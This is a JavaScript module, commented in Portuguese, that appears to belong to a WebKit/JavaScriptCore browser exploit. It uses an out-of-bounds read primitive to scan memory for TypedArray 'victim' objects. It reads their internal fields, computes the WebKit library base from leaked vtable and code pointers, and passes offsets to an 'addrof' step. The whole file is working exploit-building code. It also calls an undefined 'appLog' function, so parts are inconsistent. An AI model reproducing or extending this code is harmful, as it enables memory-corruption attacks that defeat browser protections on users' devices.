// js/victim_finder.mjs
import { AdvancedInt64 } from './int64.mjs';
import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG, WEBKIT_LIBRARY_INFO, updateOOBConfigFromUI } from './config.mjs'; // Importa WEBKIT_LIBRARY_INFO

const FNAME_BASE = "VictimFinder";

const TYPED_ARRAY_MODES = { /* ... como antes ... */
    0x00: "Int8Array", 0x01: "Int16Array", 0x02: "Int32Array", 0x03: "Uint8Array",
    0x04: "Uint8ClampedArray", 0x05: "Uint16Array", 0x06: "Uint32Array",
    0x07: "Float32Array", 0x08: "Float64Array", 0x09: "DataView",
};

// Esta seria uma variável GLOBAL no seu app, que seria setada
// APÓS você conseguir vazar o endereço base da biblioteca WebKit.
// Por enquanto, é null.
let leakedWebKitBaseAddress = null; // Ex: new AdvancedInt64("0x7f0123450000");

// Você precisaria popular isso com os endereços ABSOLUTOS das VTables
// uma vez que leakedWebKitBaseAddress seja conhecido.
// Ex: KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [
// leakedWebKitBaseAddress.add(new AdvancedInt64(WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.VTable_Possible_Offsets[0]))
// ];
let KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [];


export function setLeakedWebKitBaseAddress(baseAddrHex) {
    try {
        leakedWebKitBaseAddress = new AdvancedInt64(baseAddrHex);
        log(`Endereço base da WebKit definido para: ${leakedWebKitBaseAddress.toString(true)}`, "good", FNAME_BASE);
        // Recalcular endereços absolutos de VTables conhecidas
        KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.VTable_Possible_Offsets.map(offsetHex =>
            leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(offsetHex))
        );
        log(`VETORES DE VTABLE ABSOLUTOS CONHECIDOS (exemplos): ${KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.map(a => a.toString(true)).join(', ')}`, 'info', FNAME_BASE);
    } catch (e) {
        log(`Erro ao definir endereço base da WebKit: ${e.message}`, "error", FNAME_BASE);
        leakedWebKitBaseAddress = null;
        KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = [];
    }
}


async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
    try {
        // Ler VTable (StructureID ou ponteiro para Structure)
        const vtableReadOffset = currentCandidateBaseRelOffset + (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0);
        const vtable_ptr = Core.oob_read_relative(vtableReadOffset, 8);

        let vtableMatch = false;
        if (leakedWebKitBaseAddress && KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0) {
            for (const knownVTableAddr of KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES) {
                if (vtable_ptr.equals(knownVTableAddr)) {
                    vtableMatch = true;
                    break;
                }
            }
        } else if (vtable_ptr && !vtable_ptr.isNullPtr() && !vtable_ptr.isNegativeOne()) {
            // Sem base da lib, só podemos logar o ponteiro da vtable para análise manual.
            // Se este valor for consistente para TypedArrays, pode ser usado como uma assinatura fraca.
        }


        const modeReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_MODE_OFFSET;
        const m_mode_val = Core.oob_read_relative(modeReadOffset, 1);

        const lengthReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET;
        const m_length_val = Core.oob_read_relative(lengthReadOffset, 4);

        const vectorReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
        const m_vector_ptr = Core.oob_read_relative(vectorReadOffset, 8);

        const typeName = TYPED_ARRAY_MODES[m_mode_val] || null;
        const isLengthPlausible = m_length_val > 0 && m_length_val < (1024 * 1024 * 32);
        const isVectorPlausible = m_vector_ptr && !m_vector_ptr.isNullPtr() && !m_vector_ptr.isNegativeOne() && m_vector_ptr.greaterThanOrEqual(new AdvancedInt64(0x1000, 0));

        // Condição de candidato: Tipo conhecido E comprimento plausível E vetor plausível
        // E (OU VTable corresponde SE a base da lib for conhecida OU apenas loga o ponteiro da VTable)
        if (typeName && isLengthPlausible && isVectorPlausible) {
            const bufferPtrReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET;
            const m_buffer_ptr = Core.oob_read_relative(bufferPtrReadOffset, 8);
            const isBufferPtrPlausible = m_buffer_ptr && !m_buffer_ptr.isNullPtr() && !m_buffer_ptr.isNegativeOne() && m_buffer_ptr.greaterThanOrEqual(new AdvancedInt64(0x1000, 0));

            if (isBufferPtrPlausible) { // Mantém esta checagem por enquanto
                const candidate = {
                    type: "TypedArray",
                    gapOrRelativeOffset: currentCandidateBaseRelOffset,
                    m_mode: m_mode_val,
                    typeName: typeName,
                    m_length: m_length_val,
                    m_vector_hex: m_vector_ptr.toString(true),
                    m_buffer_hex: m_buffer_ptr.toString(true),
                    vtable_ptr_hex: vtable_ptr ? vtable_ptr.toString(true) : "N/A",
                    vtable_match: vtableMatch // true se encontrou uma VTable conhecida (requer base da lib)
                };
                if (vtableMatch) {
                     logFn(`   CANDIDATO TYPEDARRAY (VTABLE MATCH!): GAP/OffsetRel: ${toHexS1(candidate.gapOrRelativeOffset)}, Tipo: ${typeName}, VTable: ${candidate.vtable_ptr_hex}`, 'good', `${FNAME_BASE}.scanForTypedArrays`);
                }
                return candidate;
            }
        }
    } catch (e) { /* ignora erros de leitura para esta tentativa */ }
    return null;
}


// scanForCodePointers usaria WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS
async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
    try {
        const potentialPtr = Core.oob_read_relative(currentCandidateBaseRelOffset, 8);

        if (potentialPtr && !potentialPtr.isNullPtr() && !potentialPtr.isNegativeOne()) {
            for (const [funcName, funcOffsetHex] of Object.entries(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)) {
                const funcOffsetInt64 = AdvancedInt64.fromHex(funcOffsetHex);
                const potentialBaseAddr = potentialPtr.sub(funcOffsetInt64);

                // Validação de base plausível (ex: alinhado à página, dentro de um range esperado)
                // isPlausibleLibraryBase precisaria ser implementada com mais cuidado
                if ((potentialBaseAddr.low() & 0xFFF) === 0 && potentialBaseAddr.greaterThanOrEqual(new AdvancedInt64(0x10000000,0))) { // Exemplo de checagem
                    const candidate = {
                        type: "CodePointer",
                        gapOrRelativeOffset: currentCandidateBaseRelOffset,
                        leakedPtrHex: potentialPtr.toString(true),
                        calculatedBaseHex: potentialBaseAddr.toString(true),
                        probableFunction: funcName,
                        functionOffset: funcOffsetHex
                    };
                    return candidate;
                }
            }
        }
    } catch (e) { /* ignora */ }
    return null;
}


// generalizedMemoryScan e findVictimButtonHandler precisariam ser adaptados
// para usar esses novos scanners e para permitir que o usuário defina
// o leakedWebKitBaseAddress na UI após um vazamento bem-sucedido.
// Por agora, vou manter a estrutura de scanMemoryForTypedArrayCandidates para não quebrar a UI existente,
// mas você pode expandir a partir daqui.

export async function scanMemoryForTypedArrayCandidates(scanStartRelativeOffset, scanRangeBytes, stepBytes = 8) {
    const FNAME_SCAN = `${FNAME_BASE}.scanMemory`;
    log(`--- Iniciando ${FNAME_SCAN} (TypedArray Focus) ---`, 'test', FNAME_SCAN);
    updateOOBConfigFromUI();
    log(`   Configurações da varredura: Início Relativo=${toHexS1(scanStartRelativeOffset)}, Range=${scanRangeBytes} bytes, Passo=${stepBytes} bytes`, 'info', FNAME_SCAN);

    if (!Core.oob_array_buffer_real || !Core.oob_dataview_real) { /* ... ativação OOB ... */
        log("   Tentando ativar primitiva OOB primeiro...", 'warn', FNAME_SCAN);
        await Core.triggerOOB_primitive();
        if (!Core.oob_array_buffer_real) {
            log("   ERRO: Primitiva OOB não pôde ser ativada. Varredura abortada.", 'error', FNAME_SCAN);
            return [];
        }
    }

    const candidates = [];
    const maxRelativeOffsetToScanUpTo = scanStartRelativeOffset + scanRangeBytes;
    // ... (cálculo de safeBaseCandidateLimitRelative como antes) ...
    const lastFieldStructureOffset = Math.max(JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET, JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET, JSC_OFFSETS.TypedArray.M_MODE_OFFSET, JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET) + 8;
    const safeBaseCandidateLimitRelative = (Core.oob_array_buffer_real.byteLength - OOB_CONFIG.BASE_OFFSET_IN_DV) + OOB_CONFIG.INITIAL_BUFFER_SIZE - lastFieldStructureOffset;


    for (let currentCandidateBaseRelOffset = scanStartRelativeOffset; currentCandidateBaseRelOffset < maxRelativeOffsetToScanUpTo; currentCandidateBaseRelOffset += stepBytes) {
        if (currentCandidateBaseRelOffset > safeBaseCandidateLimitRelative) {
            log(`   AVISO: Base candidata ${toHexS1(currentCandidateBaseRelOffset)} excedeu limite seguro de leitura ${toHexS1(safeBaseCandidateLimitRelative)}. Parando varredura.`, 'warn', FNAME_SCAN);
            break;
        }
        if (document.hidden) { log("Varredura abortada, página não visível.", "warn", FNAME_SCAN); break; }
        await PAUSE_LAB(1);

        const typedArrayCandidate = await scanForTypedArrays(currentCandidateBaseRelOffset, appLog);
        if (typedArrayCandidate) {
            candidates.push(typedArrayCandidate);
            // Log mais detalhado se a vtable coincidir (requer base da lib e vtables conhecidas)
             if (typedArrayCandidate.vtable_match) {
                 appLog(`   CANDIDATO TYPEDARRAY (VTABLE MATCH!): GAP/OffsetRel: ${toHexS1(typedArrayCandidate.gapOrRelativeOffset)}, Tipo: ${typedArrayCandidate.typeName}, VTable: ${typedArrayCandidate.vtable_ptr_hex}`, 'good', FNAME_SCAN);
            } else {
                 appLog(`   Candidato TypedArray: GAP/OffsetRel: ${toHexS1(typedArrayCandidate.gapOrRelativeOffset)}, Tipo: ${typedArrayCandidate.typeName}, VTable Lida: ${typedArrayCandidate.vtable_ptr_hex}`, 'leak', FNAME_SCAN);
            }
        }

        // Se quisesse procurar por ponteiros de código também:
        // const codePointerCandidate = await scanForCodePointers(currentCandidateBaseRelOffset, appLog);
        // if (codePointerCandidate) {
        //     candidates.push(codePointerCandidate);
        //     appLog(`   CANDIDATO PONTEIRO DE CÓDIGO: Encontrado em ${toHexS1(codePointerCandidate.gapOrRelativeOffset)}, Ponteiro: ${codePointerCandidate.leakedPtrHex}, Base Calc: ${codePointerCandidate.calculatedBaseHex} (para ${codePointerCandidate.probableFunction})`, 'leak', FNAME_SCAN);
        // }
    }

    if (candidates.length > 0) {
        log(`   Varredura concluída. ${candidates.filter(c=>c.type === "TypedArray").length} candidatos TypedArray encontrados.`, 'good', FNAME_SCAN);
    } else {
        log(`   Varredura concluída. Nenhum candidato TypedArray encontrado.`, 'warn', FNAME_SCAN);
    }
    log(`--- ${FNAME_SCAN} Concluído ---`, 'test', FNAME_SCAN);
    return candidates.filter(c => c.type === "TypedArray"); // Mantém o retorno focado em TypedArray por enquanto para a UI
}


// findVictimButtonHandler permanece o mesmo, mas agora scanMemoryForTypedArrayCandidates
// tem a lógica interna de scanForTypedArrays que poderia ser expandida.
export async function findVictimButtonHandler() {
    const FNAME_HANDLER = `${FNAME_BASE}.Handler`;
    // ... (lógica de pegar valores da UI como antes) ...
    const scanRangeEl = document.getElementById('victimFinderScanRange');
    const scanStepEl = document.getElementById('victimFinderScanStep');
    const scanStartOffsetEl = document.getElementById('victimFinderScanStartOffset');

    const scanRange = scanRangeEl ? parseInt(scanRangeEl.value, 10) : 4096;
    const scanStep = scanStepEl ? parseInt(scanStepEl.value, 10) : 8;
    let scanStartOffset;

    try {
        const offsetStr = scanStartOffsetEl ? scanStartOffsetEl.value.trim() : "";
        if (offsetStr === "") { 
            scanStartOffset = Core.getInitialBufferSize();
            if (scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
        } else if (offsetStr.toLowerCase().startsWith("0x")) {
            scanStartOffset = parseInt(offsetStr, 16);
        } else {
            scanStartOffset = parseInt(offsetStr, 10);
        }
        if (isNaN(scanStartOffset) || scanStartOffset < 0) {
             scanStartOffset = Core.getInitialBufferSize(); 
             if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
        } else {
            if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
        }
    } catch (e) {
        scanStartOffset = Core.getInitialBufferSize(); 
        if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
    }
    // ... (resto da lógica do handler, chamando scanMemoryForTypedArrayCandidates e processando resultados) ...

    const candidates = await scanMemoryForTypedArrayCandidates(scanStartOffset, scanRange, scanStep);

    if (candidates.length > 0) {
        appLog("Candidatos TypedArray Encontrados (GAP/Offset é relativo ao início da janela OOB):", "analysis", FNAME_HANDLER);
        candidates.forEach(c => { // Assume que candidates são todos TypedArray por enquanto
            appLog(`  - GAP/Offset: ${toHexS1(c.gapOrRelativeOffset)} | Tipo: ${c.typeName} (${toHexS1(c.m_mode,2)}) | Len: ${c.m_length} | Vec: ${c.m_vector_hex} | Buf: ${c.m_buffer_hex} | VTable: ${c.vtable_ptr_hex || 'N/Lida'}`, "analysis", FNAME_HANDLER);
        });

        const gapInputEl = document.getElementById('gap_to_test_input');
        const addrofGapEl = document.getElementById('addrofGap');
        if (candidates[0]) {
            const firstCandidateGap = candidates[0].gapOrRelativeOffset;
            if (gapInputEl) {
                gapInputEl.value = firstCandidateGap;
                appLog(`   GAP/Offset do primeiro candidato (${toHexS1(firstCandidateGap)}) populado no input 'gap_to_test_input' como ${firstCandidateGap}.`, "info", FNAME_HANDLER);
            }
            if (addrofGapEl) {
                addrofGapEl.value = firstCandidateGap;
                 appLog(`   GAP/Offset do primeiro candidato (${toHexS1(firstCandidateGap)}) populado no input 'addrofGap' como ${firstCandidateGap}.`, "info", FNAME_HANDLER);
            }
        }
    } else {
        appLog("Nenhum candidato a TypedArray encontrado na varredura com os critérios atuais.", "warn", FNAME_HANDLER);
    }
}
